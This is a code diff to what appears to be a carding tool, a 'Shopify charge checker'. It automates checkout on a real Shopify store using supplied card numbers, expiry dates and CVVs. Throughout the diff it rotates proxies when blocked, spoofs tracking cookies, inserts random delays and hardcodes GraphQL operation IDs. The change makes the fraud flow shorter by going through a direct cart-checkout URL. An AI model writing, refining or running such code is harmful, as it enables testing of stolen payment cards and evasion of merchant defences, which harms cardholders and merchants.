@@ -665,13 +665,15 @@ def parse_card_input(card_input):
     return intelligent_card_parse(card_input)
 
 
-# ========== HTTP CHECKOUT CLASS ==========
+# ========== HTTP CHECKOUT CLASS - OPTIMIZED DIRECT CHECKOUT ==========
 class ShopifyHTTPCheckout:
     def __init__(self, user_id=None):
         self.user_id = user_id
         self.base_url = "https://meta-app-prod-store-1.myshopify.com"
         self.product_handle = "retailer-id-fix-no-mapping"
-        self.product_url = f"{self.base_url}/products/{self.product_handle}"
+        
+        # DIRECT CHECKOUT URL - This takes us straight to checkout with product
+        self.direct_checkout_url = f"{self.base_url}/cart/{self.product_handle}:1?checkout=1"
         
         # Proxy management
         self.proxy_url = None
@@ -875,43 +877,66 @@ class ShopifyHTTPCheckout:
         except:
             return None
 
-    async def get_checkout_page_with_token(self, max_retries=3):  # CHANGED: Made async
-        """Get checkout page and extract session token with retry logic"""
+    async def direct_checkout_access(self, max_retries=3):
+        """Access checkout directly via cart+checkout URL and extract tokens"""
         for attempt in range(max_retries):
             try:
-                self.step(5 if attempt == 0 else 5 + attempt, "LOAD CHECKOUT", 
-                         f"Loading native checkout page (Attempt {attempt + 1}/{max_retries})", 
-                         f"Token: {self.checkout_token[:15]}..." if self.checkout_token else "None")
+                self.step(2 if attempt == 0 else 2 + attempt, "DIRECT CHECKOUT ACCESS", 
+                         f"Accessing direct checkout URL (Attempt {attempt + 1}/{max_retries})", 
+                         f"URL: {self.direct_checkout_url}")
 
-                checkout_url = f"{self.base_url}/checkouts/cn/{self.checkout_token}/en-us"
-                checkout_params = {
-                    '_r': self.generate_random_string(32),
-                    'auto_redirect': 'false',
-                    'edge_redirect': 'true',
-                    'skip_shop_pay': 'true'
+                # Set initial cookies
+                shopify_y, shopify_s = self.generate_tracking_ids()
+                initial_cookies = {
+                    'localization': 'US',
+                    '_shopify_y': shopify_y,
+                    '_shopify_s': shopify_s,
+                    'cart_currency': 'USD'
                 }
+                self.client.cookies.update(initial_cookies)
 
+                # Make the direct checkout request
                 checkout_headers = {
                     **self.headers,
                     'referer': self.base_url + '/',
-                    'sec-fetch-site': 'cross-site'
+                    'sec-fetch-site': 'same-origin'
                 }
 
-                # CHANGED: Using httpx client instead of requests session
-                resp = await self.client.get(checkout_url, headers=checkout_headers, params=checkout_params, 
-                                            timeout=30, follow_redirects=True)  # CHANGED: follow_redirects=True for 302
+                resp = await self.client.get(
+                    self.direct_checkout_url, 
+                    headers=checkout_headers, 
+                    timeout=30, 
+                    follow_redirects=True
+                )
 
                 if resp.status_code != 200:
-                    self.logger.error_log("CHECKOUT_PAGE", f"Status: {resp.status_code}", f"Attempt {attempt + 1}")
+                    self.logger.error_log("DIRECT_CHECKOUT", f"Status: {resp.status_code}", f"Attempt {attempt + 1}")
                     if attempt < max_retries - 1:
-                        await self.random_delay(2, 4)  # CHANGED: await
+                        await self.random_delay(2, 4)
                         continue
-                    return False, f"Failed to load checkout: {resp.status_code}"
+                    return False, f"Failed direct checkout: {resp.status_code}"
 
+                # Extract checkout token from final URL
+                current_url = str(resp.url)
+                self.checkout_token = self.extract_checkout_token(current_url)
+                
+                if not self.checkout_token:
+                    # Try to find token in HTML
+                    match = re.search(r'"checkoutToken":"([^"]+)"', resp.text)
+                    if match:
+                        self.checkout_token = match.group(1)
+
+                if not self.checkout_token:
+                    self.logger.error_log("TOKEN", "Could not extract checkout token from URL or HTML")
+                    if attempt < max_retries - 1:
+                        await self.random_delay(2, 4)
+                        continue
+                    return False, "Could not extract checkout token"
+
+                self.logger.data_extracted("Checkout Token", self.checkout_token[:20] + "...", "Direct URL")
+
+                # Extract session token from HTML
                 page_content = resp.text
-
-                self.logger.data_extracted("Response Headers", str(dict(resp.headers)), "HTTP Response")
-
                 self.session_token = self.extract_session_token_from_html_aggressive(page_content)
 
                 if not self.session_token:
@@ -924,47 +949,64 @@ class ShopifyHTTPCheckout:
                 if self.session_token and self.graphql_session_token:
                     self.logger.data_extracted("Final Session Token", self.session_token[:50] + "...", "Success")
                     self.logger.data_extracted("GraphQL Session Token", self.graphql_session_token, "Constructed")
+                    
+                    # Extract other needed data from page
+                    bootstrap_data = self.extract_bootstrap_data(page_content)
+                    self.logger.data_extracted("Bootstrap Data", str(list(bootstrap_data.keys())), "Page")
+
+                    self.delivery_strategy_handle = self.extract_delivery_strategy(page_content)
+                    if not self.delivery_strategy_handle:
+                        self.delivery_strategy_handle = "5315e952d539372894df63d2b7463df0-be73b24eea304774d3c2df281c6988e5"
+
+                    if 'operationName":"Proposal".*?"id":"([^"]+)"' in bootstrap_data:
+                        self.proposal_id = bootstrap_data['operationName":"Proposal".*?"id":"([^"]+)"']
+                    else:
+                        self.proposal_id = "4abf98439cf21062e036dd8d2e449f5e15e12d9d358a82376aa630c7c8c8c81e"
+
+                    if 'operationName":"SubmitForCompletion".*?"id":"([^"]+)"' in bootstrap_data:
+                        self.submit_id = bootstrap_data['operationName":"SubmitForCompletion".*?"id":"([^"]+)"']
+                    else:
+                        self.submit_id = "d32830e07b8dcb881c73c771b679bcb141b0483bd561eced170c4feecc988a59"
+
                     return True, page_content
 
                 if attempt < max_retries - 1:
                     self.logger.error_log("TOKEN_RETRY", f"Missing session token, retrying...", f"Attempt {attempt + 1}")
-                    await self.random_delay(2, 4)  # CHANGED: await
+                    await self.random_delay(2, 4)
                     continue
 
-            except httpx.ProxyError as e:  # CHANGED: httpx.ProxyError instead of requests.exceptions.ProxyError
+            except httpx.ProxyError as e:
                 self.logger.error_log("PROXY", f"Proxy error: {str(e)}", f"Attempt {attempt + 1}")
                 if attempt < max_retries - 1:
-                    # Try to get a new proxy for next attempt
                     self.proxy_url = get_proxy_for_user(self.user_id, "random")
                     if not self.proxy_url:
                         return False, "NO_PROXY_AVAILABLE"
-                    # CHANGED: Update client with new proxy
                     self.client = httpx.AsyncClient(proxy=self.proxy_url, timeout=30)
-                    await self.random_delay(2, 4)  # CHANGED: await
+                    await self.random_delay(2, 4)
                     continue
                 return False, "PROXY_DEAD"
-            except httpx.ConnectTimeout as e:  # CHANGED: httpx.ConnectTimeout instead of requests.exceptions.ConnectTimeout
+            except httpx.ConnectTimeout as e:
                 self.logger.error_log("TIMEOUT", f"Connection timeout: {str(e)}", f"Attempt {attempt + 1}")
                 if attempt < max_retries - 1:
                     self.proxy_url = get_proxy_for_user(self.user_id, "random")
                     if not self.proxy_url:
                         return False, "NO_PROXY_AVAILABLE"
                     self.client = httpx.AsyncClient(proxy=self.proxy_url, timeout=30)
-                    await self.random_delay(2, 4)  # CHANGED: await
+                    await self.random_delay(2, 4)
                     continue
                 return False, "PROXY_DEAD"
             except Exception as e:
-                self.logger.error_log("CHECKOUT_ERROR", str(e), f"Attempt {attempt + 1}")
+                self.logger.error_log("DIRECT_CHECKOUT_ERROR", str(e), f"Attempt {attempt + 1}")
                 if attempt < max_retries - 1:
-                    await self.random_delay(2, 4)  # CHANGED: await
+                    await self.random_delay(2, 4)
                     continue
-                return False, f"Checkout page error: {str(e)}"
+                return False, f"Direct checkout error: {str(e)}"
 
-        error_msg = "Could not extract session token from checkout page"
+        error_msg = "Could not access direct checkout and extract tokens"
         return False, error_msg
 
     async def execute_checkout(self, cc, mes, ano, cvv):  # CHANGED: Made async
-        """Execute checkout using HTTP requests with proxy"""
+        """Execute checkout using direct checkout URL with proxy"""
         proxy_attempts = 0
         max_attempts = 3
         
@@ -1022,273 +1064,21 @@ class ShopifyHTTPCheckout:
                     self.logger.error_log("PROXY", "Proxy system not available")
                     return False, "PROXY_SYSTEM_UNAVAILABLE"
 
-                # Step 1: Initialize session and get homepage WITH PROXY
-                self.step(1, "INIT SESSION", "Getting homepage with proxy", f"Proxy: {self.proxy_url[:30]}...")
-
-                shopify_y, shopify_s = self.generate_tracking_ids()
-
-                initial_cookies = {
-                    'localization': 'US',
-                    '_shopify_y': shopify_y,
-                    '_shopify_s': shopify_s,
-                    'cart_currency': 'USD'
-                }
-
-                # CHANGED: Set cookies in httpx client
-                self.client.cookies.update(initial_cookies)
-
-                # First request with proxy
-                start_time = time.time()
-                try:
-                    resp = await self.client.get(self.base_url, headers=self.headers, timeout=30)  # CHANGED: await
-                    request_time = time.time() - start_time
-                    
-                    if resp.status_code != 200:
-                        self.logger.error_log("HOMEPAGE", f"Failed to load homepage: {resp.status_code}")
-                        
-                        # Check if it's a blocking/ban status code
-                        if resp.status_code in [403, 429, 492, 503]:
-                            self.logger.error_log("BLOCKED", f"Proxy blocked by Shopify (Status: {resp.status_code})")
-                            # Don't mark as dead - just blocked
-                            await self.client.aclose()
-                            if proxy_attempts < max_attempts:
-                                self.logger.step(1, "PROXY BLOCKED", "Trying different proxy...", f"Status: {resp.status_code}", "BLOCKED")
-                                await self.random_delay(1, 2)
-                                continue
-                            return False, "PROXY_BLOCKED"
-                        
-                        # Update proxy success with actual response time
-                        mark_proxy_success(self.proxy_url, request_time)
-                        await self.client.aclose()
-                        if proxy_attempts < max_attempts:
-                            continue
-                        return False, f"Failed to load homepage: {resp.status_code}"
-                    
-                    # Update proxy success with actual response time
-                    mark_proxy_success(self.proxy_url, request_time)
-                    
-                except httpx.ProxyError as e:  # CHANGED: httpx.ProxyError
-                    self.logger.error_log("PROXY", f"Proxy error on homepage: {str(e)}")
-                    await self.client.aclose()
-                    if proxy_attempts < max_attempts:
-                        await self.random_delay(1, 2)
-                        continue
-                    return False, "PROXY_DEAD"
-                except httpx.ConnectTimeout as e:  # CHANGED: httpx.ConnectTimeout
-                    self.logger.error_log("TIMEOUT", f"Connection timeout on homepage: {str(e)}")
-                    await self.client.aclose()
-                    if proxy_attempts < max_attempts:
-                        await self.random_delay(1, 2)
-                        continue
-                    return False, "PROXY_DEAD"
-                except Exception as e:
-                    self.logger.error_log("CONNECTION", f"Homepage error: {str(e)}")
-                    await self.client.aclose()
-                    if proxy_attempts < max_attempts:
-                        await self.random_delay(1, 2)
-                        continue
-                    return False, f"Connection error: {str(e)[:50]}"
-
-                await self.random_delay(1, 2)  # CHANGED: await
-
-                # Step 2: Add to cart WITH PROXY
-                self.step(2, "ADD TO CART", "Adding product to cart with proxy", f"Variant: {self.variant_id}")
-
-                cart_headers = {
-                    **self.headers,
-                    'accept': 'application/javascript',
-                    'origin': self.base_url,
-                    'referer': self.product_url,
-                    'sec-fetch-dest': 'empty',
-                    'sec-fetch-mode': 'cors',
-                    'sec-fetch-site': 'same-origin',
-                    'x-requested-with': 'XMLHttpRequest'
-                }
-
-                boundary = f"----WebKitFormBoundary{self.generate_random_string(16)}"
-                cart_headers['content-type'] = f'multipart/form-data; boundary={boundary}'
-
-                payload_lines = [
-                    f'--{boundary}',
-                    'Content-Disposition: form-data; name="quantity"',
-                    '',
-                    '1',
-                    f'--{boundary}',
-                    'Content-Disposition: form-data; name="form_type"',
-                    '',
-                    'product',
-                    f'--{boundary}',
-                    'Content-Disposition: form-data; name="utf8"',
-                    '',
-                    '✓',
-                    f'--{boundary}',
-                    'Content-Disposition: form-data; name="id"',
-                    '',
-                    self.variant_id,
-                    f'--{boundary}',
-                    'Content-Disposition: form-data; name="product-id"',
-                    '',
-                    self.product_id,
-                    f'--{boundary}',
-                    'Content-Disposition: form-data; name="section-id"',
-                    '',
-                    'template--15468374917282__main',
-                    f'--{boundary}',
-                    'Content-Disposition: form-data; name="sections"',
-                    '',
-                    'cart-notification-product,cart-notification-button,cart-icon-bubble',
-                    f'--{boundary}',
-                    'Content-Disposition: form-data; name="sections_url"',
-                    '',
-                    f'/products/{self.product_handle}',
-                    f'--{boundary}--'
-                ]
-
-                cart_payload = '\r\n'.join(payload_lines)
-
-                try:
-                    resp = await self.client.post(  # CHANGED: await
-                        f"{self.base_url}/cart/add",
-                        headers=cart_headers,
-                        content=cart_payload,  # CHANGED: content instead of data for httpx
-                        timeout=30
-                    )
-
-                    if resp.status_code != 200:
-                        self.logger.error_log("CART_ADD", f"Failed to add to cart: {resp.status_code}")
-                        if proxy_attempts < max_attempts:
-                            await self.random_delay(1, 2)
-                            continue
-                        return False, f"Failed to add to cart: {resp.status_code}"
-
-                    try:
-                        cart_data = resp.json()
-                        if 'items' in cart_data and len(cart_data['items']) > 0:
-                            self.cart_token = cart_data['items'][0].get('key', '').split(':')[0]
-                    except:
-                        pass
-
-                except httpx.ProxyError as e:  # CHANGED: httpx.ProxyError
-                    self.logger.error_log("PROXY", f"Proxy error on cart add: {str(e)}")
-                    await self.client.aclose()
-                    if proxy_attempts < max_attempts:
-                        await self.random_delay(1, 2)
-                        continue
-                    return False, "PROXY_DEAD"
-                except Exception as e:
-                    self.logger.error_log("CART_ERROR", f"Cart add error: {str(e)}")
-                    if proxy_attempts < max_attempts:
-                        await self.random_delay(1, 2)
-                        continue
-                    return False, f"Cart add error: {str(e)[:50]}"
-
-                await self.random_delay(1, 2)  # CHANGED: await
-
-                # Step 3: Get cart page WITH PROXY
-                self.step(3, "GET CART", "Loading cart page with proxy")
-
-                cart_page_headers = {
-                    **self.headers,
-                    'referer': self.product_url,
-                    'sec-fetch-site': 'same-origin'
-                }
-
-                try:
-                    resp = await self.client.get(f"{self.base_url}/cart", headers=cart_page_headers, timeout=30)  # CHANGED: await
-                except httpx.ProxyError as e:  # CHANGED: httpx.ProxyError
-                    self.logger.error_log("PROXY", f"Proxy error on cart page: {str(e)}")
-                    await self.client.aclose()
-                    if proxy_attempts < max_attempts:
-                        await self.random_delay(1, 2)
-                        continue
-                    return False, "PROXY_DEAD"
-
-                await self.random_delay(1, 2)  # CHANGED: await
-
-                # Step 4: Start checkout WITH PROXY
-                self.step(4, "START CHECKOUT", "Initiating checkout process with proxy")
-
-                checkout_start_headers = {
-                    **self.headers,
-                    'content-type': 'application/x-www-form-urlencoded',
-                    'origin': self.base_url,
-                    'referer': self.product_url,
-                    'sec-fetch-site': 'same-origin'
-                }
-
-                try:
-                    resp = await self.client.post(  # CHANGED: await
-                        f"{self.base_url}/cart",
-                        headers=checkout_start_headers,
-                        data={'checkout': ''},  # CHANGED: data for form data
-                        follow_redirects=True,  # CHANGED: follow_redirects=True
-                        timeout=30
-                    )
-
-                    current_url = str(resp.url)  # CHANGED: resp.url is URL object in httpx
-                    self.checkout_token = self.extract_checkout_token(current_url)
-
-                    if not self.checkout_token:
-                        match = re.search(r'"checkoutToken":"([^"]+)"', resp.text)
-                        if match:
-                            self.checkout_token = match.group(1)
-
-                    if not self.checkout_token:
-                        if proxy_attempts < max_attempts:
-                            await self.random_delay(1, 2)
-                            continue
-                        return False, "Could not extract checkout token"
-
-                    self.logger.data_extracted("Checkout Token", self.checkout_token[:20] + "...", "URL")
-
-                except httpx.ProxyError as e:  # CHANGED: httpx.ProxyError
-                    self.logger.error_log("PROXY", f"Proxy error on checkout start: {str(e)}")
-                    await self.client.aclose()
-                    if proxy_attempts < max_attempts:
-                        await self.random_delay(1, 2)
-                        continue
-                    return False, "PROXY_DEAD"
-                except Exception as e:
-                    self.logger.error_log("CHECKOUT_START", f"Checkout start error: {str(e)}")
-                    if proxy_attempts < max_attempts:
-                        await self.random_delay(1, 2)
-                        continue
-                    return False, f"Checkout start error: {str(e)[:50]}"
-
-                await self.random_delay(2, 3)  # CHANGED: await
-
-                # Step 5: Get checkout page with session token extraction WITH PROXY
-                success, page_content = await self.get_checkout_page_with_token(max_retries=3)  # CHANGED: await
-
+                # Step 1: Access checkout directly and extract tokens
+                self.step(1, "INIT SESSION", "Accessing direct checkout URL with proxy", f"Proxy: {self.proxy_url[:30]}...")
+                
+                success, result = await self.direct_checkout_access(max_retries=2)
+                
                 if not success:
                     if proxy_attempts < max_attempts:
                         await self.random_delay(1, 2)
                         continue
-                    return False, page_content
+                    return False, result
 
-                bootstrap_data = self.extract_bootstrap_data(page_content)
-                self.logger.data_extracted("Bootstrap Data", str(list(bootstrap_data.keys())), "Page")
+                await self.random_delay(2, 3)
 
-                self.delivery_strategy_handle = self.extract_delivery_strategy(page_content)
-                if self.delivery_strategy_handle:
-                    self.logger.data_extracted("Delivery Strategy", self.delivery_strategy_handle, "Page")
-                else:
-                    self.delivery_strategy_handle = "5315e952d539372894df63d2b7463df0-be73b24eea304774d3c2df281c6988e5"
-
-                if 'operationName":"Proposal".*?"id":"([^"]+)"' in bootstrap_data:
-                    self.proposal_id = bootstrap_data['operationName":"Proposal".*?"id":"([^"]+)"']
-                else:
-                    self.proposal_id = "4abf98439cf21062e036dd8d2e449f5e15e12d9d358a82376aa630c7c8c8c81e"
-
-                if 'operationName":"SubmitForCompletion".*?"id":"([^"]+)"' in bootstrap_data:
-                    self.submit_id = bootstrap_data['operationName":"SubmitForCompletion".*?"id":"([^"]+)"']
-                else:
-                    self.submit_id = "d32830e07b8dcb881c73c771b679bcb141b0483bd561eced170c4feecc988a59"
-
-                await self.random_delay(2, 3)  # CHANGED: await
-
-                # Step 6: Submit Proposal mutation WITH PROXY
-                self.step(6, "SUBMIT PROPOSAL", "Submitting checkout proposal with proxy", self.email)
+                # Step 2: Submit Proposal mutation WITH PROXY
+                self.step(2, "SUBMIT PROPOSAL", "Submitting checkout proposal with proxy", self.email)
 
                 graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
 
@@ -1520,8 +1310,8 @@ class ShopifyHTTPCheckout:
 
                 await self.random_delay(1, 2)  # CHANGED: await
 
-                # Step 7: Create payment session with PCI WITH PROXY
-                self.step(7, "CREATE PAYMENT", "Creating payment session with PCI and proxy")
+                # Step 3: Create payment session with PCI WITH PROXY
+                self.step(3, "CREATE PAYMENT", "Creating payment session with PCI and proxy")
 
                 pci_headers = {
                     'authority': 'checkout.pci.shopifyinc.com',
@@ -1612,15 +1402,13 @@ class ShopifyHTTPCheckout:
 
                 await self.random_delay(1, 2)  # CHANGED: await
 
-                # Step 8: Submit for completion WITH PROXY
-                self.step(8, "SUBMIT PAYMENT", "Submitting payment for processing with proxy")
+                # Step 4: Submit for completion WITH PROXY
+                self.step(4, "SUBMIT PAYMENT", "Submitting payment for processing with proxy")
 
                 # FIXED: Generate attemptToken in correct format: checkout_token-randomstring
                 attempt_token = f"{self.checkout_token}-{self.generate_random_string(12)}"
 
                 # FIXED: Correct structure based on working request
-                # sessionInput is inside input object
-                # attemptToken, analytics, metafields are at variables level, not inside input
                 submit_variables = {
                     "input": {
                         "sessionInput": {
@@ -1868,7 +1656,7 @@ class ShopifyHTTPCheckout:
                         if receipt.get('__typename') == 'ProcessingReceipt':
                             poll_delay = receipt.get('pollDelay', 500) / 1000
 
-                            self.step(9, "POLL RECEIPT", f"Waiting {poll_delay}s then polling for result")
+                            self.step(5, "POLL RECEIPT", f"Waiting {poll_delay}s then polling for result")
 
                             await asyncio.sleep(poll_delay)  # CHANGED: await asyncio.sleep
 
@@ -1906,7 +1694,6 @@ class ShopifyHTTPCheckout:
 
             except httpx.RequestError as e:  # CHANGED: httpx.RequestError
                 self.logger.error_log("NETWORK", f"Network error: {str(e)}")
-                # CHANGED: Check for Connection error and PCI error to return PROXY_DEAD
                 error_str = str(e).lower()
                 if "connection error" in error_str or "pci error" in error_str:
                     if proxy_attempts < max_attempts:
@@ -1919,7 +1706,6 @@ class ShopifyHTTPCheckout:
                 return False, f"Network error: {str(e)[:50]}"
             except Exception as e:
                 self.logger.error_log("UNKNOWN", f"Checkout error: {str(e)}")
-                # CHANGED: Check for Connection error and PCI error to return PROXY_DEAD
                 error_str = str(e).lower()
                 if "connection error" in error_str or "pci error" in error_str:
                     if proxy_attempts < max_attempts:
@@ -2020,7 +1806,7 @@ class ShopifyChargeCheckerHTTP:
         self.proxy_status = "Dead 🚫"  # Default proxy status
 
     async def check_card(self, card_details, username, user_data):
-        """Main card checking method using HTTP checkout with proxy"""
+        """Main card checking method using direct HTTP checkout with proxy"""
         start_time = time.time()
 
         self.logger = ShopifyLogger(self.user_id)
